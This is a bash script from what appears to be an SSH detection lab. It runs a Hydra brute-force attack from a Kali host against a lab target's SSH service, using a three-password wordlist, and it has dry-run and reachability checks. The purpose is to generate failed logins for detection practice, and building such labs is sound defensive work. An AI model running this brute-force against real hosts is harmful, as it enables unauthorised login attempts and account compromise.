#!/usr/bin/env bash
# ============================================================
# Phase 02 — SSH Brute-Force Attack Runner
# ============================================================
# Runs Hydra against the lab target. Reads target IP and username
# from /etc/ssh-detection-response/lab.env on the Kali attacker host
# (or the path passed via $LAB_ENV).
#
# This is intentionally non-destructive: a 3-password wordlist and
# 4 parallel tasks. The point is to generate observable failures,
# not to actually break in.
#
# Usage:
#   ./run-attack.sh                 # uses default env path
#   LAB_ENV=/path/to/lab.env ./run-attack.sh
#   ./run-attack.sh --user alice    # override target user
#   ./run-attack.sh --dry-run       # print the command, do not run
# ============================================================

set -euo pipefail

LAB_ENV="${LAB_ENV:-/etc/ssh-detection-response/lab.env}"
DRY_RUN=0
USER_OVERRIDE=""

usage() {
    sed -n '2,/^# =====/p' "$0" | sed 's/^# \{0,1\}//'
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --dry-run)   DRY_RUN=1; shift ;;
        --user)      USER_OVERRIDE="$2"; shift 2 ;;
        -h|--help)   usage ;;
        *)           echo "Unknown arg: $1"; usage ;;
    esac
done

if [[ ! -r "$LAB_ENV" ]]; then
    echo "ERROR: cannot read $LAB_ENV" >&2
    echo "       Set LAB_ENV=/path/to/lab.env or copy lab.env.example to that path." >&2
    exit 2
fi

# shellcheck disable=SC1090
source "$LAB_ENV"

TARGET="${TARGET_IP:?TARGET_IP not set in $LAB_ENV}"
USER="${USER_OVERRIDE:-${LAB_USER:?LAB_USER not set in $LAB_ENV}}"

# Three-password list, written next to this script.
WORDLIST="$(dirname "$(readlink -f "$0")")/pw.txt"
if [[ ! -f "$WORDLIST" ]]; then
    cat > "$WORDLIST" <<'EOF'
password
123456
letmein
EOF
fi

CMD=(hydra -l "$USER" -P "$WORDLIST" -t 4 -V "ssh://${TARGET}")

echo "==> Target:    ${TARGET}"
echo "==> User:      ${USER}"
echo "==> Wordlist:  ${WORDLIST} ($(wc -l < "$WORDLIST") entries)"
echo "==> Command:   ${CMD[*]}"
echo

if [[ $DRY_RUN -eq 1 ]]; then
    echo "[dry-run] not executing"
    exit 0
fi

# Sanity: make sure target is reachable before launching.
if ! ping -c1 -W2 "$TARGET" >/dev/null 2>&1; then
    echo "ERROR: target $TARGET is not reachable. Check vmbr1 / VM state." >&2
    exit 3
fi

exec "${CMD[@]}"
